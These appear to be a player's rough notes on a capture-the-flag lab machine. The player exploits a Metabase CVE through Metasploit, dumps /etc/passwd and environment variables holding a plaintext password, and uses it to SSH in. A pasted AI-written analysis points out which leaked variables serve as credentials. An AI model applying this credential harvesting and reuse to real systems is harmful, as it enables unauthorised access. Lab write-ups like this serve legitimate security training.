Okay so data.analytical.htb is running a Metabase login service. I think it could be vulnerable as there is a cve out there
The session token is: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
The version is "tag": "v0.46.6", which is seems to be vulnerable
The payload did not seem to work but metasploit seems to work with the following
![[Pasted image 20240317141116.png]]
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash

I upgrade the rubbish shell to a meterpreter session but I dont know where the user flag is

The environment variables:
env MB_LDAP_BIND_DN= LANGUAGE=en_US:en USER=metabase HOSTNAME=479d5d91f6b4 FC_LANG=en-US SHLVL=5 LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib HOME=/home/metabase MB_EMAIL_SMTP_PASSWORD= LC_CTYPE=en_US.UTF-8 JAVA_VERSION=jdk-11.0.19+7 LOGNAME=metabase _=/bin/sh MB_DB_CONNECTION_URI= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_PASS= MB_JETTY_HOST=0.0.0.0 META_PASS=An4lytics_ds20223# LANG=en_US.UTF-8 MB_LDAP_PASSWORD= SHELL=/bin/sh MB_EMAIL_SMTP_USERNAME= MB_DB_USER= META_USER=metalytics LC_ALL=en_US.UTF-8 JAVA_HOME=/opt/java/openjdk PWD=/ MB_DB_FILE=//metabase.db/metabase.db

GPT made it nice:
1. **Metabase User**: The user `metabase` has a home directory at `/home/metabase` and uses `/bin/ash` as their shell. This could be useful for exploring the file system or looking for sensitive files in the user's home directory.
    
2. **Metabase Database**: There is a mention of a Metabase database file at `//metabase.db/metabase.db`. This might be a typo with the double slashes, but it points to a possible local database file that can contain sensitive information.
    
3. **Meta Pass**: There's an environment variable `META_PASS=An4lytics_ds20223#`. This looks like a password and could be used for authentication if you can find the service or account it is associated with.
    
4. **Meta User**: Similarly, `META_USER=metalytics` appears to be a username which, in conjunction with `META_PASS`, could be credentials for a service or login.
    
5. **MB_DB_PASS and MB_DB_USER**: These environment variables are meant for database connection, but they are empty. If they were populated, they might have provided database credentials.
    
6. **MB_LDAP_BIND_DN and MB_LDAP_PASSWORD**: These are intended for LDAP bind DN and password, but they are also empty. If filled, they could have given LDAP credentials.
    
7. **MB_EMAIL_SMTP_USERNAME and MB_EMAIL_SMTP_PASSWORD**: These variables suggest that there's an SMTP configuration, possibly for sending emails from Metabase. The password is empty, which means either it is not set, or the application is not configured to send emails.
    
8. **MB_JETTY_HOST**: It is set to listen on all interfaces (`0.0.0.0`). This indicates that the Metabase service is configured to be accessible from any network interface.
    
9. **MB_DB_CONNECTION_URI**: It is empty, but if it had been filled in, it could have provided the JDBC connection string to the Metabase database.
    
10. **Environment Path**: The path variable includes the standard directories plus the Java OpenJDK path. This might be useful if you need to run Java applications or compile Java exploits.
    
11. **Java Home and Version**: This might be useful for running Java-based exploits or tools.
    
12. **LANG, LC_CTYPE, and LC_ALL**: These are set to `en_US.UTF-8`, indicating the locale and character encoding settings.


Then I went and 
	ssh metalytics@10.10.11.233
	password: An4lytics_ds20223#